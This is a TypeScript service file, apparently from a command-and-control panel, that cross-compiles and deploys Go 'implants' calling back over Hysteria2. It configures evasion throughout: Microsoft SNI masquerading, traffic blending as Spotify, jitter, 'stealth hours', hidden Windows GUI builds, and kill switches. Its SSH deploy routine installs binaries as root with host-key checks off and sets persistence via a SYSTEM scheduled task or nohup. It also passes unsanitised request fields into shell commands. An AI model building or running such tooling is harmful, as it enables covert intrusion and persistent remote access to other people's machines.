/**
 * Enhanced Implant Build & Deploy Service
 * Real Go toolchain compilation and SSH/API deployment to Hysteria nodes.
 * Features: retry logic, validation, metrics, parallel builds, caching
 */

import { exec } from "node:child_process"
import { promisify } from "node:util"
import { writeFile, mkdir, readFile, unlink, stat, access } from "node:fs/promises"
import { join } from "node:path"
import { createHash, randomUUID } from "node:crypto"
import { prisma } from "@/lib/db"
import logger from "@/lib/logger"

const execAsync = promisify(exec)
const log = logger.child({ module: "implant-build" })

const IMPLANT_DIR = join(process.cwd(), "implant")
const OUTPUT_DIR = join(process.cwd(), "implant", "build")
const CACHE_DIR = join(process.cwd(), "implant", ".build-cache")
const LOG_DIR = join(process.cwd(), "implant", "build-logs")

// Build metrics tracking
interface BuildMetrics {
  totalBuilds: number
  successfulBuilds: number
  failedBuilds: number
  averageBuildTime: number
  cacheHits: number
  cacheMisses: number
}

let buildMetrics: BuildMetrics = {
  totalBuilds: 0,
  successfulBuilds: 0,
  failedBuilds: 0,
  averageBuildTime: 0,
  cacheHits: 0,
  cacheMisses: 0
}

export interface BuildRequest {
  nodeId: string
  targetOs: string
  targetArch: string
  stealthLevel?: "standard" | "high" | "maximum"
  trafficBlendProfile?: string
  customSni?: string
  callbackInterval?: number
  jitter?: number
  enablePersistence?: boolean
  killSwitchTrigger?: string
  buildFlags?: string[]
  autoStart?: boolean
  enableCache?: boolean
  validateBinary?: boolean
  maxRetries?: number
  priority?: "low" | "normal" | "high"
}

export interface BuildResult {
  success: boolean
  implantId?: string
  implantDbId?: string
  binaryPath?: string
  binarySize?: number
  md5?: string
  sha256?: string
  deployedTo?: string
  error?: string
  buildOutput?: string
  buildTime?: number
  validationPassed?: boolean
  cacheHit?: boolean
  retryCount?: number
  warnings?: string[]
}

/**
 * Compile the real Go implant from implant/ directory with cross-compilation.
 * Enhanced with retry logic, caching, validation, and metrics.
 */
export async function compileImplant(req: BuildRequest, retryCount: number = 0): Promise<BuildResult> {
  const startTime = Date.now()
  const implantId = `imp_${Date.now()}_${randomUUID().slice(0, 8)}`
  const binaryName = req.targetOs === "windows" ? `h2-implant-${implantId}.exe` : `h2-implant-${implantId}`
  const binaryPath = join(OUTPUT_DIR, binaryName)
  const enableCache = req.enableCache !== false
  const validateBinary = req.validateBinary !== false
  const maxRetries = req.maxRetries || 3
  const warnings: string[] = []

  buildMetrics.totalBuilds++

  try {
    await mkdir(OUTPUT_DIR, { recursive: true })
    await mkdir(CACHE_DIR, { recursive: true })
    await mkdir(LOG_DIR, { recursive: true })

    // 1. Resolve node from DB
    const node = await prisma.hysteriaNode.findUnique({ where: { id: req.nodeId } })
    if (!node) {
      buildMetrics.failedBuilds++
      return { success: false, error: `Node not found: ${req.nodeId}` }
    }

    // 2. Check cache if enabled
    const cacheKey = `${req.targetOs}-${req.targetArch}-${node.id}-${req.stealthLevel || "high"}`
    const cacheFile = join(CACHE_DIR, `${cacheKey}.bin`)
    let cacheHit = false

    if (enableCache) {
      try {
        await access(cacheFile)
        log.info({ implantId, cacheKey }, "Cache hit, copying from cache")
        await execAsync(`cp ${cacheFile} ${binaryPath}`)
        buildMetrics.cacheHits++
        cacheHit = true
      } catch {
        log.info({ implantId, cacheKey }, "Cache miss, building from source")
        buildMetrics.cacheMisses++
      }
    }

    // 3. Generate implant config JSON (embedded at build time via ldflags)
    const implantConfig = {
      implant_id: implantId,
      servers: [node.hostname],
      password: process.env.IMPLANT_DEFAULT_PASSWORD || "dpanel-implant-bootstrap-token",
      sni: req.customSni || "www.microsoft.com",
      obfs: "salamander",
      masquerade: "proxy",
      base_interval: req.callbackInterval || 45,
      jitter: req.jitter || 25,
      // Enhanced config with new beacon features
      max_retries: 3,
      backoff_multiplier: 2.0,
      max_backoff: 300,
      kill_switch_enabled: true,
      heartbeat_interval: 300,
      network_aware: true,
      stealth_hours: [0, 1, 2, 3, 4, 5, 22, 23],
      subscription_url: `${process.env.NEXT_PUBLIC_BASE_URL || "http://localhost:3000"}/api/sub/hysteria2?token=IMPLANT_TOKEN&implant=true`,
      stealth_level: req.stealthLevel || "high",
      traffic_blend: req.trafficBlendProfile || "spotify",
      kill_switch: req.killSwitchTrigger || "72h_no_beacon",
      persistence: req.enablePersistence ? "enabled" : "none",
    }

    const configPath = join(OUTPUT_DIR, `config-${implantId}.json`)
    await writeFile(configPath, JSON.stringify(implantConfig, null, 2))
    log.info({ implantId, configPath }, "Implant config written")

    // 4. Cross-compile the Go implant (if not from cache)
    const goOS = req.targetOs
    const goArch = req.targetArch
    
    if (!cacheHit) {
      let ldflags = `-s -w -X main.version=2.1.0-shadowgrok -X main.implantId=${implantId} -X main.buildTime=${new Date().toISOString()}`

      // Platform-specific optimizations
      if (req.targetOs === "windows") {
        ldflags += ` -H=windowsgui`
      } else if (req.targetOs === "linux" && req.targetArch === "amd64") {
        ldflags += ` -buildmode=pie`
      }

      const extraFlags = req.buildFlags?.join(" ") || ""
      const buildCmd = [
        `cd ${IMPLANT_DIR}`,
        `&&`,
        `GOOS=${goOS} GOARCH=${goArch} CGO_ENABLED=0`,
        `go build`,
        `-ldflags "${ldflags}"`,
        `-trimpath`,
        `-tags "netgo osusergo static_build"`,
        ...extraFlags ? [extraFlags] : [],
        `-o ${binaryPath}`,
        `.`
      ].join(" ")

      log.info({ buildCmd, goOS, goArch, implantId, retryCount }, "Compiling implant")

      const logFile = join(LOG_DIR, `${implantId}.log`)
      const { stdout, stderr } = await execAsync(`${buildCmd} 2>&1 | tee ${logFile}`, {
        timeout: 180_000, // 3 min timeout for compilation
        maxBuffer: 10 * 1024 * 1024,
      })

      if (stderr) {
        if (stderr.includes("warning")) {
          warnings.push(`Compiler warning: ${stderr}`)
          log.warn({ stderr, implantId }, "Build produced warnings")
        } else {
          throw new Error(`Compilation failed: ${stderr}`)
        }
      }

      // Cache the binary if enabled
      if (enableCache) {
        await execAsync(`cp ${binaryPath} ${cacheFile}`)
        log.info({ cacheKey }, "Binary cached")
      }
    }

    // 5. Validate binary if enabled
    let validationPassed = true
    if (validateBinary) {
      const validationResult = await performBinaryValidation(binaryPath, req.targetOs)
      validationPassed = validationResult.valid
      if (!validationResult.valid) {
        warnings.push(`Validation warning: ${validationResult.message}`)
        log.warn({ validationResult, implantId }, "Binary validation produced warnings")
      }
    }

    // 6. Verify binary exists and compute hashes
    const fileStat = await stat(binaryPath)
    const fileBuffer = await readFile(binaryPath)
    const md5 = createHash("md5").update(fileBuffer).digest("hex")
    const sha256 = createHash("sha256").update(fileBuffer).digest("hex")

    const buildTime = Date.now() - startTime
    log.info({ implantId, size: fileStat.size, md5, sha256, buildTime, validationPassed }, "Binary compiled successfully")

    // Update metrics
    buildMetrics.successfulBuilds++
    buildMetrics.averageBuildTime = (buildMetrics.averageBuildTime * (buildMetrics.successfulBuilds - 1) + buildTime) / buildMetrics.successfulBuilds

    // 7. Create implant record in DB
    const implant = await prisma.implant.create({
      data: {
        implantId,
        name: `${node.name}-${goOS}-${goArch}`,
        type: "hysteria2-quic",
        architecture: `${goOS}/${goArch}`,
        targetId: req.nodeId,
        status: "deployed",
        config: implantConfig as any,
        transportConfig: {
          protocol: "hysteria2",
          servers: [node.hostname],
          port: node.listenAddr || ":443",
          obfs: "salamander",
        } as any,
        nodeId: req.nodeId,
        lastSeen: new Date(),
        firstSeen: new Date(),
      },
    })

    log.info({ implantId, dbId: implant.id }, "Implant DB record created")

    // 8. Deploy to node via SSH if configured
    let deployedTo = node.hostname
    if (req.autoStart && process.env.DEPLOY_SSH_KEY) {
      const deployResult = await deployViaSSHWithRetry(binaryPath, node.hostname, implantId, req.targetOs, maxRetries)
      deployedTo = deployResult.deployedTo
      if (deployResult.warnings) {
        warnings.push(...deployResult.warnings)
      }
    }

    // 9. Cleanup config file
    await unlink(configPath).catch(() => {})

    return {
      success: true,
      implantId,
      implantDbId: implant.id,
      binaryPath,
      binarySize: fileStat.size,
      md5,
      sha256,
      deployedTo,
      buildOutput: cacheHit ? "Restored from cache" : "Built from source",
      buildTime,
      validationPassed,
      cacheHit,
      retryCount,
      warnings,
    }
  } catch (error: any) {
    buildMetrics.failedBuilds++
    log.error({ err: error, implantId, retryCount }, "Implant compilation failed")

    // Retry logic
    if (retryCount < maxRetries) {
      log.info({ implantId, retryCount: retryCount + 1, maxRetries }, "Retrying compilation")
      await new Promise(resolve => setTimeout(resolve, 1000 * (retryCount + 1))) // Exponential backoff
      return compileImplant(req, retryCount + 1)
    }

    return {
      success: false,
      error: `Compilation failed after ${retryCount} retries: ${error.message}`,
      retryCount,
    }
  }
}

/**
 * Deploy compiled binary to a node via SSH/SCP with retry logic and verification.
 */
async function deployViaSSHWithRetry(
  binaryPath: string,
  hostname: string,
  implantId: string,
  targetOs: string,
  maxRetries: number = 3,
  retryCount: number = 0
): Promise<{ deployedTo: string; warnings?: string[] }> {
  const sshKey = process.env.DEPLOY_SSH_KEY!
  const sshUser = process.env.DEPLOY_SSH_USER || "root"
  const remoteDir = process.env.DEPLOY_REMOTE_DIR || "/opt/implants"
  const remotePath = `${remoteDir}/h2-implant-${implantId}`
  const warnings: string[] = []

  try {
    // Create remote directory
    const mkdirCmd = `ssh -i ${sshKey} -o StrictHostKeyChecking=no -o ConnectTimeout=10 ${sshUser}@${hostname} "mkdir -p ${remoteDir}"`
    await execAsync(mkdirCmd, { timeout: 30_000 })

    // SCP the binary with retry logic
    const scpCmd = `scp -i ${sshKey} -o StrictHostKeyChecking=no -o ConnectTimeout=10 ${binaryPath} ${sshUser}@${hostname}:${remotePath}`
    try {
      await execAsync(scpCmd, { timeout: 60_000 })
    } catch (scpError: any) {
      if (retryCount < maxRetries) {
        warnings.push(`SCP attempt ${retryCount + 1} failed: ${scpError.message}`)
        await new Promise(resolve => setTimeout(resolve, 2000 * (retryCount + 1)))
        return deployViaSSHWithRetry(binaryPath, hostname, implantId, targetOs, maxRetries, retryCount + 1)
      }
      throw scpError
    }

    // Verify file was transferred correctly
    const verifyCmd = `ssh -i ${sshKey} -o StrictHostKeyChecking=no ${sshUser}@${hostname} "test -f ${remotePath} && echo 'exists'"`
    const { stdout: verifyOutput } = await execAsync(verifyCmd, { timeout: 10_000 })
    
    if (!verifyOutput.includes("exists")) {
      throw new Error("File verification failed after transfer")
    }

    // Start the implant on the remote host
    const startCmd = targetOs === "windows"
      ? `ssh -i ${sshKey} -o StrictHostKeyChecking=no ${sshUser}@${hostname} "schtasks /create /tn h2-implant-${implantId} /tr ${remotePath} /sc onstart /ru SYSTEM"`
      : `ssh -i ${sshKey} -o StrictHostKeyChecking=no ${sshUser}@${hostname} "chmod +x ${remotePath} && nohup ${remotePath} > /dev/null 2>&1 &"`

    await execAsync(startCmd, { timeout: 30_000 })
    
    // Verify process is running (Unix only)
    if (targetOs !== "windows") {
      const checkCmd = `ssh -i ${sshKey} -o StrictHostKeyChecking=no ${sshUser}@${hostname} "pgrep -f h2-implant-${implantId}"`
      try {
        await execAsync(checkCmd, { timeout: 10_000 })
        log.info({ hostname, implantId }, "Implant process verified running")
      } catch {
        warnings.push("Could not verify process is running on remote host")
      }
    }

    log.info({ hostname, implantId }, "Implant deployed and started via SSH with verification")
    return { deployedTo: hostname, warnings }
  } catch (error: any) {
    log.warn({ err: error, hostname, implantId, retryCount }, "SSH deployment failed, binary available for manual deploy")
    warnings.push(`SSH deployment failed: ${error.message}`)
    return { deployedTo: `${hostname} (manual deploy required)`, warnings }
  }
}

/**
 * Validate binary integrity and format
 */
async function performBinaryValidation(binaryPath: string, targetOs: string): Promise<{ valid: boolean; message: string }> {
  try {
    const fileStat = await stat(binaryPath)
    
    // Check file size (should be > 1MB and < 50MB)
    if (fileStat.size < 1048576 || fileStat.size > 52428800) {
      return { valid: false, message: `Binary size ${fileStat.size} is outside expected range (1MB-50MB)` }
    }

    // Check if binary is executable (Unix only)
    if (targetOs !== "windows") {
      try {
        await execAsync(`test -x ${binaryPath}`)
      } catch {
        await execAsync(`chmod +x ${binaryPath}`)
      }
    }

    // Try to identify file type
    try {
      const { stdout } = await execAsync(`file ${binaryPath}`)
      const fileType = stdout.toLowerCase()
      
      switch (targetOs) {
        case "windows":
          if (!fileType.includes("pe32")) {
            return { valid: false, message: `Not a valid Windows PE binary: ${fileType}` }
          }
          break
        case "linux":
          if (!fileType.includes("elf")) {
            return { valid: false, message: `Not a valid Linux ELF binary: ${fileType}` }
          }
          break
        case "darwin":
          if (!fileType.includes("mach-o")) {
            return { valid: false, message: `Not a valid macOS Mach-O binary: ${fileType}` }
          }
          break
      }
    } catch {
      // file command might not be available, skip this check
    }

    return { valid: true, message: "Binary validation passed" }
  } catch (error: any) {
    return { valid: false, message: `Validation error: ${error.message}` }
  }
}

/**
 * Build all platform variants using the enhanced build.sh script.
 */
export async function buildAllPlatforms(options?: {
  parallel?: number
  enableCache?: boolean
  validateBinaries?: boolean
}): Promise<{
  success: boolean
  artifacts: string[]
  buildTime?: number
  error?: string
  warnings?: string[]
}> {
  const startTime = Date.now()
  const warnings: string[] = []

  try {
    await mkdir(join(IMPLANT_DIR, "build"), { recursive: true })
    await mkdir(join(IMPLANT_DIR, "dist"), { recursive: true })

    const parallel = options?.parallel || 4
    const cacheFlag = options?.enableCache !== false ? "ENABLE_CACHE=true" : "ENABLE_CACHE=false"
    const validateFlag = options?.validateBinaries !== false ? "VALIDATE_BINARIES=true" : "VALIDATE_BINARIES=false"

    const buildCmd = `PARALLEL_BUILDS=${parallel} ${cacheFlag} ${validateFlag} bash build.sh`
    
    log.info({ buildCmd, parallel }, "Starting all-platform build")

    const { stdout, stderr } = await execAsync(buildCmd, {
      cwd: IMPLANT_DIR,
      timeout: 600_000, // 10 min for all platforms
      maxBuffer: 10 * 1024 * 1024,
    })

    if (stderr && stderr.includes("warning")) {
      warnings.push(`Build warnings: ${stderr}`)
    }

    // List generated artifacts
    const distDir = join(IMPLANT_DIR, "dist")
    const { stdout: lsOutput } = await execAsync(`ls -1 ${distDir}`)
    const artifacts = lsOutput.trim().split("\n").filter(Boolean)

    const buildTime = Date.now() - startTime
    log.info({ artifacts, buildTime }, "All-platform build completed")
    
    return { success: true, artifacts, buildTime, warnings }
  } catch (error: any) {
    log.error({ err: error }, "All-platform build failed")
    return { success: false, artifacts: [], error: error.message }
  }
}

/**
 * Get build metrics
 */
export function getBuildMetrics(): BuildMetrics {
  return { ...buildMetrics }
}

/**
 * Reset build metrics
 */
export function resetBuildMetrics(): void {
  buildMetrics = {
    totalBuilds: 0,
    successfulBuilds: 0,
    failedBuilds: 0,
    averageBuildTime: 0,
    cacheHits: 0,
    cacheMisses: 0
  }
}

/**
 * Clean up old build artifacts
 */
export async function cleanupBuildArtifacts(maxAge: number = 24 * 60 * 60 * 1000): Promise<{
  cleaned: number
  errors: string[]
}> {
  const errors: string[] = []
  let cleaned = 0

  try {
    const now = Date.now()
    
    // Clean output directory
    const outputFiles = await execAsync(`find ${OUTPUT_DIR} -type f -mtime +1`).catch(() => ({ stdout: "" }))
    if (outputFiles.stdout) {
      const files = outputFiles.stdout.trim().split("\n").filter(Boolean)
      for (const file of files) {
        try {
          const stats = await stat(file)
          if (now - stats.mtimeMs > maxAge) {
            await unlink(file)
            cleaned++
          }
        } catch (err) {
          errors.push(`Failed to clean ${file}: ${err}`)
        }
      }
    }

    // Clean cache directory (older than 7 days)
    const cacheFiles = await execAsync(`find ${CACHE_DIR} -type f -mtime +7`).catch(() => ({ stdout: "" }))
    if (cacheFiles.stdout) {
      const files = cacheFiles.stdout.trim().split("\n").filter(Boolean)
      for (const file of files) {
        try {
          await unlink(file)
          cleaned++
        } catch (err) {
          errors.push(`Failed to clean cache ${file}: ${err}`)
        }
      }
    }

    // Clean old log files (older than 3 days)
    const logFiles = await execAsync(`find ${LOG_DIR} -type f -mtime +3`).catch(() => ({ stdout: "" }))
    if (logFiles.stdout) {
      const files = logFiles.stdout.trim().split("\n").filter(Boolean)
      for (const file of files) {
        try {
          await unlink(file)
          cleaned++
        } catch (err) {
          errors.push(`Failed to clean log ${file}: ${err}`)
        }
      }
    }

    log.info({ cleaned, errors }, "Build artifact cleanup completed")
    return { cleaned, errors }
  } catch (error: any) {
    log.error({ err: error }, "Build artifact cleanup failed")
    return { cleaned, errors: [error.message] }
  }
}

/**
 * Clear build cache
 */
export async function clearBuildCache(): Promise<{ success: boolean; error?: string }> {
  try {
    const cacheFiles = await execAsync(`find ${CACHE_DIR} -type f`).catch(() => ({ stdout: "" }))
    if (cacheFiles.stdout) {
      const files = cacheFiles.stdout.trim().split("\n").filter(Boolean)
      for (const file of files) {
        await unlink(file).catch(() => {})
      }
    }
    log.info("Build cache cleared")
    return { success: true }
  } catch (error: any) {
    log.error({ err: error }, "Failed to clear build cache")
    return { success: false, error: error.message }
  }
}
